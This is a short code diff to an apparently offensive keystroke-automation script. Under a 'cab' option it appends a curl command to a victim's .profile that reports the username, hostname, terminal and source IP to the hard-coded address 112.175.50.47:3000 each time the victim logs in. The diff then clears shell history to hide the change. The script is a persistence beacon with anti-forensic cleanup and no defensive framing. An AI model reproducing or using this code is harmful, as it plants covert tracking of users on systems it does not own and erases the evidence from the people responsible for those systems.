@@ -159,7 +159,9 @@ if args.ch:
     clearHistory()
 
 if args.cab:
-    write("echo 'curl -s \"http://112.175.50.47:3000?user=$(whoami)&host=$(hostname)\" > /dev/null' >> .profile")
+    write("echo \"curl -s \\\"http://112.175.50.47:3000?user=$(whoami)&host=$(hostname)&pts=\$(who -m | awk '{print(\\$2)}')&source_ip=\$(who -m | awk '{print(\\$6)}' | cut -d '(' -f2 | cut -d ')' -f1)\\\" > /dev/null\" >> .profile")
+    press("Return")
+    write("history -c")
     press("Return")
 
 if len(sys.argv)==1:
